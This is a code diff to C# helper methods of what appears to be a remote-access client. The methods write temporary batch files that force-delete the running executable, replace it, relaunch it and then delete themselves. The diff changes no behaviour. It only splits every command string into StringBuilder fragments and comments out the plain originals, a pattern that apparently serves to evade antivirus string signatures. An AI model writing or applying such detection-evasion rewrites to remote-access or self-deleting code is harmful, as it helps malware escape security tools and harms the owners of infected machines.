@@ -18,15 +18,23 @@ namespace Rouzzf.Client.IO
         {
             string batchFile = FileHelper.GetTempFilePath(".bat");
 
-            string uninstallBatch =
+            StringBuilder sb = new StringBuilder();
+            sb.Append("@echo").Append(" off").Append("\r\n");
+            sb.Append("chcp").Append(" 65001").Append("\r\n");
+            sb.Append("echo").Append(" DONT").Append(" CLOSE").Append(" THIS").Append(" WINDOW!").Append("\r\n");
+            sb.Append("ping").Append(" -n").Append(" 10").Append(" localhost").Append(" >").Append(" nul").Append("\r\n");
+            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
+            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(batchFile).Append("\"");
+
+            /*string uninstallBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                 "ping -n 10 localhost > nul" + "\r\n" +
                 "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
-                "del /a /q /f " + "\"" + batchFile + "\"";
+                "del /a /q /f " + "\"" + batchFile + "\"";*/
 
-            File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
+            File.WriteAllText(batchFile, sb.ToString(), new UTF8Encoding(false));
             return batchFile;
         }
 
@@ -40,7 +48,18 @@ namespace Rouzzf.Client.IO
         {
             string batchFile = FileHelper.GetTempFilePath(".bat");
 
-            string updateBatch =
+
+            StringBuilder sb = new StringBuilder();
+            sb.Append("@echo").Append(" off").Append("\r\n");
+            sb.Append("chcp").Append(" 65001").Append("\r\n");
+            sb.Append("echo").Append(" DONT").Append(" CLOSE").Append(" THIS").Append(" WINDOW!").Append("\r\n");
+            sb.Append("ping").Append(" -n").Append(" 10").Append(" localhost").Append(" >").Append(" nul").Append("\r\n");
+            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
+            sb.Append("move").Append(" /y").Append(" \"").Append(newFilePath).Append("\"").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
+            sb.Append("start").Append(" \"").Append("\"").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
+            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(batchFile).Append("\"");
+
+            /*string updateBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
@@ -48,9 +67,9 @@ namespace Rouzzf.Client.IO
                 "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                 "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                 "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
-                "del /a /q /f " + "\"" + batchFile + "\"";
+                "del /a /q /f " + "\"" + batchFile + "\"";*/
 
-            File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
+            File.WriteAllText(batchFile, sb.ToString(), new UTF8Encoding(false));
             return batchFile;
         }
 
@@ -63,15 +82,24 @@ namespace Rouzzf.Client.IO
         {
             string batchFile = FileHelper.GetTempFilePath(".bat");
 
-            string restartBatch =
+
+            StringBuilder sb = new StringBuilder();
+            sb.Append("@echo").Append(" off").Append("\r\n");
+            sb.Append("chcp").Append(" 65001").Append("\r\n");
+            sb.Append("echo").Append(" DONT").Append(" CLOSE").Append(" THIS").Append(" WINDOW!").Append("\r\n");
+            sb.Append("ping").Append(" -n").Append(" 10").Append(" localhost").Append(" >").Append(" nul").Append("\r\n");
+            sb.Append("start").Append(" \"").Append("\"").Append(" \"").Append(currentFilePath).Append("\"").Append("\r\n");
+            sb.Append("del").Append(" /a").Append(" /q").Append(" /f").Append(" \"").Append(batchFile).Append("\"");
+            
+            /*string restartBatch =
                 "@echo off" + "\r\n" +
                 "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                 "ping -n 10 localhost > nul" + "\r\n" +
                 "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
-                "del /a /q /f " + "\"" + batchFile + "\"";
+                "del /a /q /f " + "\"" + batchFile + "\"";*/
 
-            File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));
+            File.WriteAllText(batchFile, sb.ToString(), new UTF8Encoding(false));
 
             return batchFile;
         }
